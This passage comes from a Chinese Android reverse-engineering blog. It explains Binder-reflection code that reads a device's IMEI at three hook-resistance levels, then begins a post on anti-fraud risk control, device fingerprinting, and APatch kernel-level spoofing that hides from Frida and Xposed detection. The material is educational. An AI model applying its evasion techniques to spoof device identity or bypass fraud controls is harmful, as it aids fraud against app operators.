class="string">&quot;asInterface&quot;</span>, IBinder.class);</span><br><span class="line">        asInterface.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">binderProxy</span> <span class="operator">=</span> asInterface.invoke(<span class="literal">null</span>, binder);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">getDeviceId</span> <span class="operator">=</span> binderProxy.getClass().getDeclaredMethod(<span class="string">&quot;getDeviceId&quot;</span>, String.class);</span><br><span class="line">            <span class="keyword">if</span> (getDeviceId != <span class="literal">null</span>) &#123;</span><br><span class="line">                deviceId = binderGetHardwareInfo(context.getPackageName(),</span><br><span class="line">                        binder, BinderUtil.getInterfaceDescriptor(binderProxy),</span><br><span class="line">                        BinderUtil.getTransactionId(binderProxy, <span class="string">&quot;TRANSACTION_getDeviceId&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getDeviceId</span> <span class="operator">=</span> binderProxy.getClass().getDeclaredMethod(<span class="string">&quot;getDeviceId&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (getDeviceId != <span class="literal">null</span>) &#123;</span><br><span class="line">            deviceId = binderGetHardwareInfo(<span class="string">&quot;&quot;</span>,</span><br><span class="line">                    binder, BinderUtil.getInterfaceDescriptor(binderProxy),</span><br><span class="line">                    BinderUtil.getTransactionId(binderProxy, <span class="string">&quot;TRANSACTION_getDeviceId&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="comment">//();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> deviceId;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ServiceManager</code> 提供的 <code>IBinder</code> 和 <code>ITelephony</code> 的 <code>asInterface</code> 方法分别工作在 <strong>连接层</strong> 和 <strong>接口协议层</strong>，它们各司其职，共同完成了整个跨进程通信（IPC）的流程</p><h3 id="deviceid"><a href="#deviceid" class="headerlink" title="deviceid"></a>deviceid</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SuppressLint(&quot;MissingPermission&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getDeviceId</span><span class="params">(Context context)</span> &#123;</span><br><span class="line"></span><br><span class="line">    String deviceId;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//先看底下</span></span><br><span class="line">    <span class="keyword">if</span> (!TextUtils.isEmpty(deviceId = ITelephonyUtil.getDeviceIdLevel2(context))</span><br><span class="line">            || !TextUtils.isEmpty(deviceId = IPhoneSubInfoUtil.getDeviceIdLevel2(context))) &#123;</span><br><span class="line">        <span class="keyword">return</span> deviceId;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//再看中部</span></span><br><span class="line">    <span class="keyword">if</span> (!TextUtils.isEmpty(deviceId = ITelephonyUtil.getDeviceIdLevel1(context))</span><br><span class="line">            || !TextUtils.isEmpty(deviceId = IPhoneSubInfoUtil.getDeviceIdLevel1(context))) &#123;</span><br><span class="line">        <span class="keyword">return</span> deviceId;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//再看上部</span></span><br><span class="line">    <span class="keyword">if</span> (!TextUtils.isEmpty(deviceId = IPhoneSubInfoUtil.getDeviceIdLevel0(context))</span><br><span class="line">            || !TextUtils.isEmpty(deviceId = ITelephonyUtil.getDeviceIdLevel0(context))) &#123;</span><br><span class="line">        <span class="keyword">return</span> deviceId;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">TelephonyManager</span> <span class="variable">telephonyManager</span> <span class="operator">=</span> ((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE));</span><br><span class="line">        deviceId =telephonyManager.getDeviceId();</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception ignore)&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> deviceId;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该方法按照从最难 Hook 到最容易 Hook 的顺序</p><h4 id="Level2"><a href="#Level2" class="headerlink" title="Level2"></a>Level2</h4><p>第一个先从<code>ITelephonyUtil.getDeviceIdLevel2(context)</code></p><p><code>IPhoneSubInfoUtil.getDeviceIdLevel2(context)</code>这两个函数获取</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//风险  如果底层ROM改了ServiceManager，那就可能有问题，但是概率很小</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getDeviceIdLevel2</span><span class="params">(Context context)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">deviceId</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">ServiceManager</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.os.ServiceManager&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getService</span> <span class="operator">=</span> ServiceManager.getDeclaredMethod(<span class="string">&quot;getService&quot;</span>, String.class);</span><br><span class="line">        getService.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">IBinder</span> <span class="variable">binder</span> <span class="operator">=</span> (IBinder) getService.invoke(<span class="literal">null</span>, <span class="string">&quot;iphonesubinfo&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">Stub</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.android.internal.telephony.IPhoneSubInfo$Stub&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">asInterface</span> <span class="operator">=</span> Stub.getDeclaredMethod(<span class="string">&quot;asInterface&quot;</span>, IBinder.class);</span><br><span class="line">        asInterface.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">binderProxy</span> <span class="operator">=</span> asInterface.invoke(<span class="literal">null</span>, binder);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">getDeviceId</span> <span class="operator">=</span> binderProxy.getClass().getDeclaredMethod(<span class="string">&quot;getDeviceId&quot;</span>, String.class);</span><br><span class="line">            <span class="keyword">if</span> (getDeviceId != <span class="literal">null</span>) &#123;</span><br><span class="line">                deviceId = binderGetHardwareInfo(context.getPackageName(),</span><br><span class="line">                        binder, BinderUtil.getInterfaceDescriptor(binderProxy),</span><br><span class="line">                        BinderUtil.getTransactionId(binderProxy, <span class="string">&quot;TRANSACTION_getDeviceId&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getDeviceId</span> <span class="operator">=</span> binderProxy.getClass().getDeclaredMethod(<span class="string">&quot;getDeviceId&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (getDeviceId != <span class="literal">null</span>) &#123;</span><br><span class="line">            deviceId = binderGetHardwareInfo(<span class="string">&quot;&quot;</span>,</span><br><span class="line">                    binder, BinderUtil.getInterfaceDescriptor(binderProxy),</span><br><span class="line">                    BinderUtil.getTransactionId(binderProxy, <span class="string">&quot;TRANSACTION_getDeviceId&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="comment">//();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> deviceId;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">ServiceManager</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.os.ServiceManager&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">getService</span> <span class="operator">=</span> ServiceManager.getDeclaredMethod(<span class="string">&quot;getService&quot;</span>, String.class);</span><br><span class="line">getService.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">IBinder</span> <span class="variable">binder</span> <span class="operator">=</span> (IBinder) getService.invoke(<span class="literal">null</span>, <span class="string">&quot;iphonesubinfo&quot;</span>);</span><br></pre></td></tr></table></figure><p>这里获取的是<code>IBinder</code>对象，是<code>android.os.BinderProxy</code>类</p><p>通过<code>asInterface</code>调用转换成<code>...IPhoneSubInfo$Stub$Proxy</code>类</p><p>简单来说，<code>asInterface</code> 就是一个<strong>适配器（Adapter）或者工厂方法</strong>，它将一个通用的、底层的 <code>BinderProxy</code> 对象，转换成了一个专用的、易于使用的服务接口代理<code>$Stub$Proxy</code>对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">getDeviceId</span> <span class="operator">=</span> binderProxy.getClass().getDeclaredMethod(<span class="string">&quot;getDeviceId&quot;</span>, String.class);</span><br><span class="line"><span class="keyword">if</span> (getDeviceId != <span class="literal">null</span>) &#123;</span><br><span class="line">    deviceId = binderGetHardwareInfo(context.getPackageName(),</span><br><span class="line">            binder, BinderUtil.getInterfaceDescriptor(binderProxy),</span><br><span class="line">            BinderUtil.getTransactionId(binderProxy, <span class="string">&quot;TRANSACTION_getDeviceId&quot;</span>));</span><br></pre></td></tr></table></figure><p>而真正的核心实现在于<code>binderGetHardwareInfo</code>，模拟了底层的IPC交互</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//    其实这里多一个参数并没有什么影响</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">binderGetHardwareInfo</span><span class="params">(String callingPackage,</span></span><br><span class="line"><span class="params">                                            IBinder remote,</span></span><br><span class="line"><span class="params">                                            String DESCRIPTOR,</span></span><br><span class="line"><span class="params">                                            <span class="type">int</span> tid)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line"></span><br><span class="line">    android.os.<span class="type">Parcel</span> <span class="variable">_data</span> <span class="operator">=</span> android.os.Parcel.obtain();</span><br><span class="line">    android.os.<span class="type">Parcel</span> <span class="variable">_reply</span> <span class="operator">=</span> android.os.Parcel.obtain();</span><br><span class="line">    String _result;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        _data.writeInterfaceToken(DESCRIPTOR);</span><br><span class="line">        <span class="keyword">if</span> (!TextUtils.isEmpty(callingPackage)) &#123;</span><br><span class="line">            _data.writeString(callingPackage);</span><br><span class="line">        &#125;</span><br><span class="line">        remote.transact(tid, _data, _reply, <span class="number">0</span>);</span><br><span class="line">        _reply.readException();</span><br><span class="line">        _result = _reply.readString();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        _reply.recycle();</span><br><span class="line">        _data.recycle();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> _result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">android.os.<span class="type">Parcel</span> <span class="variable">_data</span> <span class="operator">=</span> android.os.Parcel.obtain();</span><br><span class="line">android.os.<span class="type">Parcel</span> <span class="variable">_reply</span> <span class="operator">=</span> android.os.Parcel.obtain();</span><br></pre></td></tr></table></figure><p><strong>首先获取两个<code>Parcel</code>对象</strong></p><blockquote><p><code>Parcel</code> 是 Android 中用于在进程间传递数据的高性能容器。</p><ul><li><code>_data</code>: 用来打包所有需要<strong>发送给</strong>远程服务的数据，包括要调用的接口信息和方法参数</li><li><code>_reply</code>: 用来接收远程服务<strong>返回的</strong>数据，包括返回值和可能的异常信息</li><li><code>obtain()</code>: 从一个全局池中获取可复用的 <code>Parcel</code> 对象，以提高性能，避免频繁创建和销毁对象</li></ul></blockquote><p><strong>然后写入接口描述符</strong> (<code>writeInterfaceToken</code>)，<code>_data.writeInterfaceToken(DESCRIPTOR)</code></p><p>其中<code>DESCRIPTOR</code>是唯一标识字符串</p><p>代表了要调用的接口（例如<code>&quot;com.android.internal.telephony.IPhoneSubInfo&quot;</code>），在 <code>_data</code> 包的最开始写入这个“<strong>令牌</strong>”，远程服务在收到数据后会首先读取并验证它，确保客户端请求的是正确的服务接口，防止调用混乱</p><p><strong>之后写入方法参数</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!TextUtils.isEmpty(callingPackage)) &#123;</span><br><span class="line">    _data.writeString(callingPackage);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里将 <code>getDeviceId</code> 方法所需的参数写入 <code>_data</code> 包，此时参数是通过<code>context.getPackageName()</code>获取，即是调用方的包名</p><ul><li>如果 <code>callingPackage</code> 不为空，就将其写入 <code>_data</code>，对应 <code>getDeviceId(String pkg)</code> 这种方法签名。</li><li>如果 <code>callingPackage</code> 为空，就不写入任何东西，对应 <code>getDeviceId()</code> 这种无参的方法签名。</li></ul><p><strong>发起远程事务 (<code>transact</code>)</strong></p><ul><li><code>remote.transact(tid, _data, _reply, 0);</code></li></ul><p>这是整个过程的核心，它真正地发起了跨进程调用。</p><p><code>remote</code>: 这是从 <code>ServiceManager</code> 获取到的原始 <code>IBinder</code> 对象（一个 <code>BinderProxy</code> 实例），代表了通往远程服务的连接通道。</p><p><code>tid</code>参数就是<code>TransactionId</code>（事务id），然后<code>_data</code>包含接口令牌和参数的输入数据包，<code>_reply</code>用于接收返回结果的空数据包，<code>0</code>是事务标志位，<code>0</code> 表示这是一次标准的同步调用，方法会阻塞直到远程服务处理完毕并返回结果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    _reply.readException();</span><br><span class="line">    _result = _reply.readString();</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    _reply.recycle();</span><br><span class="line">    _data.recycle();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>最后就处理返回结果和回收Parcel对象了</strong></p><p>但是从 <code>Android 10 (API 29)</code> 开始，获取是可以正常获取，但是就无法正常使用了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TelephonyPermissions    com.android.phone                    W  reportAccessDeniedToReadIdentifiers:com.sheep.anti:getDeviceId:-1</span><br></pre></td></tr></table></figure><p>会报错误显示没权限访问</p><h4 id="Level1"><a href="#Level1" class="headerlink" title="Level1"></a>Level1</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getDeviceIdLevel1</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">ServiceManager</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.os.ServiceManager&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getService</span> <span class="operator">=</span> ServiceManager.getDeclaredMethod(<span class="string">&quot;getService&quot;</span>, String.class);</span><br><span class="line">        getService.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">IBinder</span> <span class="variable">binder</span> <span class="operator">=</span> (IBinder) getService.invoke(<span class="literal">null</span>, <span class="string">&quot;iphonesubinfo&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">Stub</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.android.internal.telephony.IPhoneSubInfo$Stub&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">asInterface</span> <span class="operator">=</span> Stub.getDeclaredMethod(<span class="string">&quot;asInterface&quot;</span>, IBinder.class);</span><br><span class="line">        asInterface.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">binderProxy</span> <span class="operator">=</span> asInterface.invoke(<span class="literal">null</span>, binder);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">getDeviceId</span> <span class="operator">=</span> binderProxy.getClass().getDeclaredMethod(<span class="string">&quot;getDeviceId&quot;</span>, String.class);</span><br><span class="line">            <span class="keyword">if</span> (getDeviceId != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> (String) getDeviceId.invoke(binderProxy, context.getPackageName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getDeviceId</span> <span class="operator">=</span> binderProxy.getClass().getDeclaredMethod(<span class="string">&quot;getDeviceId&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (getDeviceId != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> (String) getDeviceId.invoke(binderProxy);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="comment">//();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是直接调用<code>com.android.internal.telephony.IPhoneSubInfo$Stub$Proxy-&gt;getDeviceId</code>方法</p><h4 id="Level0"><a href="#Level0" class="headerlink" title="Level0"></a>Level0</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getDeviceIdLevel0</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">    <span class="type">TelephonyManager</span> <span class="variable">telephonyManager</span> <span class="operator">=</span> ((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE));</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> TelephonyManager.class.getDeclaredMethod(<span class="string">&quot;getSubscriberInfo&quot;</span>);</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">binderProxy</span> <span class="operator">=</span> method.invoke(telephonyManager);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">getDeviceId</span> <span class="operator">=</span> binderProxy.getClass().getDeclaredMethod(<span class="string">&quot;getDeviceId&quot;</span>, String.class);</span><br><span class="line">            <span class="keyword">if</span> (getDeviceId != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> (String) getDeviceId.invoke(binderProxy, context.getPackageName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getDeviceId</span> <span class="operator">=</span> binderProxy.getClass().getDeclaredMethod(<span class="string">&quot;getDeviceId&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (getDeviceId != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> (String) getDeviceId.invoke(binderProxy);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="comment">//();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过<code>getSubscriberInfo</code>获取其代理对象，剩下步骤都差不多了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本文的项目来自于&lt;a href=&quot;https://github.com/happylishang/AntiFakerAndroidCheck</summary>
      
    
    
    
    <category term="安卓逆向" scheme="http://s1nec-1o.github.io/categories/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91/"/>
    
    
    <category term="android" scheme="http://s1nec-1o.github.io/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向从入门到入土之初识风控(2)</title>
    <link href="http://s1nec-1o.github.io/2025/10/21/Android%E9%80%86%E5%90%91%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E4%B9%8B%E5%88%9D%E8%AF%86%E9%A3%8E%E6%8E%A7-2/"/>
    <id>http://s1nec-1o.github.io/2025/10/21/Android%E9%80%86%E5%90%91%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E4%B9%8B%E5%88%9D%E8%AF%86%E9%A3%8E%E6%8E%A7-2/</id>
    <published>2025-10-21T14:17:54.000Z</published>
    <updated>2025-10-21T14:22:50.429Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文几乎都是来自于<strong>珍惜any大佬</strong>的文章，主要是作为小白的学习记录</p><p>原文：</p><p><a href="https://bbs.kanxue.com/thread-273838.htm">https://bbs.kanxue.com/thread-273838.htm</a></p><p><a href="https://bbs.kanxue.com/thread-273759.htm">https://bbs.kanxue.com/thread-273759.htm</a></p><p><a href="https://bbs.kanxue.com/thread-277402.htm">https://bbs.kanxue.com/thread-277402.htm</a></p><p><a href="https://bbs.kanxue.com/thread-277637.htm">https://bbs.kanxue.com/thread-277637.htm</a></p><p>其中一些较为难懂的（其实是我看不懂）的代码都做了分析的随笔（其实是AI）</p><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="设备指纹（Device-Fingerprint）"><a href="#设备指纹（Device-Fingerprint）" class="headerlink" title="设备指纹（Device Fingerprint）"></a>设备指纹（Device Fingerprint）</h3><ul><li>设备指纹是应用用来识别你手机的一种技术，类似于给你的设备一个”身份证”</li><li>它会收集你的：<strong>IMEI、Android ID、MAC地址、设备型号、屏幕分辨率等</strong>信息</li><li>应用通过这些信息来识别是否是同一台设备，用于风控、防作弊等</li></ul><h3 id="Hook-Binder"><a href="#Hook-Binder" class="headerlink" title="Hook Binder"></a>Hook Binder</h3><ul><li>Binder是Android的<strong>核心IPC（进程间通信）机制</strong></li><li>应用获取设备信息时，都要通过Binder与系统服务通信</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">应用 → Binder → 系统服务（获取IMEI等信息）</span><br><span class="line">       ↑</span><br><span class="line">    Hook这里拦截和修改返回值</span><br></pre></td></tr></table></figure><p><strong>缺点：</strong></p><ul><li>需要在应用进程内注入代码<strong>（二次打包或Xposed&#x2F;Frida）</strong></li><li>留下很多痕迹<strong>（注入特征、Hook特征）</strong></li></ul><h3 id="APatch-内核层对抗"><a href="#APatch-内核层对抗" class="headerlink" title="APatch - 内核层对抗"></a>APatch - 内核层对抗</h3><ul><li>新一代Root方案，基于内核模块</li><li>相比Magisk，它可以直接在内核层进行修改</li></ul><blockquote><p>Magisk是通过修改<code>/boot.img</code>，在系统启动时挂载系统文件，来达到root的目的</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">传统Hook流程：</span><br><span class="line">应用 → [Hook框架在应用层拦截] → Binder → 系统服务 → 内核</span><br><span class="line"></span><br><span class="line">APatch方式：</span><br><span class="line">应用 → Binder → 系统服务 → [在内核层直接拦截并返回假数据]</span><br></pre></td></tr></table></figure><p><strong>优点：</strong></p><ul><li>绕过应用层的检测（<strong>反Frida、反Xposed检测</strong>）</li><li>在内核层修改，<strong>应用层完全无感知</strong></li></ul><blockquote><p>对抗的本质：谁在更底层，谁就有优势</p></blockquote><p>风控的全称应该是风险控制，为了解决和预防将要发生，或者可能发生的一些危险情况，从而减轻损失。</p><h2 id="风控概述"><a href="#风控概述" class="headerlink" title="风控概述"></a>风控概述</h2><h3 id="蜜罐数据"><a href="#蜜罐数据" class="headerlink" title="蜜罐数据"></a>蜜罐数据</h3><p>什么是蜜罐数据？当发现作弊以后返回的数据是<strong>非正常的数据</strong>，可能存在<strong>埋点</strong>等信息，<strong>比如视频里面在随机帧率里面添加水印，或者返回一些错误数据或者重复的数据</strong>，这些数据往往是已经被污染或者肉眼无法识别是否正确，从而<strong>欺骗攻击者</strong>。</p><h3 id="IP限制："><a href="#IP限制：" class="headerlink" title="IP限制："></a>IP限制：</h3><p>这个不多说，当某一个IP过量或者过快请求的时候会进行限制，返回错误的数据或者返回蜜罐数据。</p><blockquote><p>很多爬虫会买入很多代理，这些代理也都是不安全的，很多大厂也会买入一部分代理，代理毕竟是谁都可以用的，买完以后在服务端直接配置上黑名单即可，很多黑产或者攻击者会采用流量的方式进行请求，将数据转发到路由器，一个类似“猫池”的路由器，里面内置很多手机卡，可以通过设置，将数据通过内部随机手机卡进行发送请求，从而实现动态代理。从而规避一些IP限制的检测。</p></blockquote><h3 id="设备指纹"><a href="#设备指纹" class="headerlink" title="设备指纹"></a>设备指纹</h3><p>设备指纹主要为了解决就是设备的唯一性，防护方通过采集手机的某些字段，从而实现得到设备唯一的标识</p><p>客户端的采集准确程度，有时候也大幅度的决定了后端策略的风控方向</p><p>设备指纹唯一ID，相当于用户的<code>token</code> ，设备指纹的准确性和唯一性，决定安全SDK的强度</p><p><strong>其检测方式也只是为了提升攻击者绕过的成本</strong></p><p>但是手机重置以后或者恢复出厂设置以后，大部分大厂的设备指纹都无法做到设备唯一性的确认</p><h3 id="App环境信息"><a href="#App环境信息" class="headerlink" title="App环境信息"></a>App环境信息</h3><p>当策略或者防护发现某个token或者某个设备唯一标识出现问题的时候，可能第一时间就是去检测这个设备的环境信息，用于是否石锤当前用户是否作弊</p><ul><li>正常设备 